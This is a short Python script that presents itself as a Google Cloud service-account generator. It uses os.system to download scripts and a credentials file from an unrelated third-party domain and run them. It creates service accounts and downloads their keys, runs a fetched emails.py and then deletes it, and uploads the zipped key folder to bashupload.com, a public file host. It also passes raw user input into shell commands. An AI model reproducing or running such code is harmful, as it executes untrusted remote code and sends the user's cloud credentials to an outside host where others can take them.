import os
os.system('wget https://javbabes.me/sagen/requirements.txt')
os.system('pip3 install -r requirements.txt')
os.system('wget https://javbabes.me/sagen/gen_sa_accounts.py')
os.system('python3 gen_sa_accounts.py')
projectid = input("Enter Your Project id = ")
enable = " --enable-services "
sas = " --create-sas "
download = " --download-keys "
os.system('wget https://javbabes.me/sagen/credentials.json')
os.system('python3 gen_sa_accounts.py')
os.system('python3 gen_sa_accounts.py ' + enable + projectid)
os.system('python3 gen_sa_accounts.py ' + sas + projectid)
os.system('python3 gen_sa_accounts.py ' + download + projectid)

os.system('rm credentials.json')
os.system('rm token_sa.pickle')

os.system('wget -P accounts https://javbabes.me/sagen/emails.py')
os.system('python3 ./accounts/emails.py')
os.system('rm ./accounts/emails.py')
os.system('zip -r -Z bzip2 accounts.zip accounts')
os.system('curl bashupload.com -T accounts.zip')